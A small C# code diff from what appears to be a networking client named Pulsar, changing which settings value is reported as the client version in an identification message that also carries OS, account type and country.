@@ -171,7 +171,7 @@ namespace Pulsar.Client.Networking
 
                 client.Send(new ClientIdentification
                 {
-                    Version = Settings.VERSION,
+                    Version = Settings.ReportedVersion,
                     OperatingSystem = PlatformHelper.FullName,
                     AccountType = userAccount.Type.ToString(),
                     Country = geoInfo.Country,
